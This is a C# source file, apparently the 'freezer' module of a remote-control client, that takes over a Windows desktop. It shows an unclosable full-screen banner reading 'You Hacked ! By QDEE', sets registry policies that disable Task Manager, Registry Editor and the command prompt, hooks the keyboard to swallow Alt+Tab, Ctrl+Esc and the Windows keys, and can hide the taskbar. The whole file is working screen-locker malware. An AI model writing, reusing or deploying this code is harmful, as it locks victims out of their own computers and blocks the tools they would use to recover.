using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Drawing;

namespace ClIENT_PC.Controller
{
    class FreezerController : ControllerBase
    {
        public void Freezer()
        {
            Thread th = new Thread(() =>
            {
                FreezeEcranForm from = new FreezeEcranForm("You Hacked ! By QDEE " + Environment.NewLine + " Snitch ;)");
                from.Show();
                Application.Run();
            });
            th.Priority = ThreadPriority.Highest;
            th.IsBackground = false;
            th.SetApartmentState(ApartmentState.STA);
            th.Start();
        }
        //http://www.tamas.io/c-disable-ctrl-alt-del-alt-tab-alt-f4-start-menu-and-so-on/
        private void desactiverComposant()
        {

        }
    }
    class FreezeEcranForm : Form
    {
        public Point Loc = new Point();
        string WL;
        string HL;
        string Maxed = FormWindowState.Normal.ToString();
        bool FullScreen = false;

        public FreezeEcranForm(string Texte)
        {
            this.Load += new System.EventHandler(this.Form1_Load);
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Opacity = 0.70;
            this.TopMost = true;
            Label texte = new Label()
            {
                Text = Texte,
                TextAlign = ContentAlignment.TopCenter,
                AutoSize = false,
                Dock = DockStyle.Fill,
                Font = new System.Drawing.Font(this.Font.FontFamily, 66),
            };
            this.Controls.Add(texte);
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch (Exception)
            {
            }

            Thread th = new Thread(() =>
            {
                this.Invoke((MethodInvoker)(() =>
                {
                    this.TopMost = true;
                }));
            });
            th.Start();

            if (FullScreen == false)
            {
                FullScreen = true;
                if (this.WindowState == FormWindowState.Maximized)
                {
                    this.WindowState = FormWindowState.Normal;
                    Maxed = FormWindowState.Maximized.ToString();
                }
                Loc = this.Location;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                this.TopMost = true;
                WL = this.Width.ToString();
                HL = this.Height.ToString();
                this.Height = Convert.ToInt16(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height.ToString());
                this.Width = Convert.ToInt16(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
                this.Location = new Point(0, 0);
            }
        }
        public void KillCtrlAltDelete()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch
            {
                //MessageBox.Show(ex.ToString());
            }
        }
        //Kill Alt F4
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnClosing(e);
            UnhookWindowsHookEx(intLLKey);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        public const int WH_KEYBOARD_LL = 13;

        /*code needed to disable start menu*/
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        public static int intLLKey;

        public int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key,
                    blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 0)) | ((lParam.vkCode == 91) && (lParam.flags == 1)) | ((lParam.vkCode == 92) && (lParam.flags == 1)) | ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat == true)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }
        public void KillStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }
        public static void ShowStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }
        public static void EnableCTRLALTDEL()
        {
            try
            {
                string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                RegistryKey rk = Registry.CurrentUser;
                RegistryKey sk1 = rk.OpenSubKey(subKey);
                if (sk1 != null)
                    rk.DeleteSubKeyTree(subKey);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
    }
}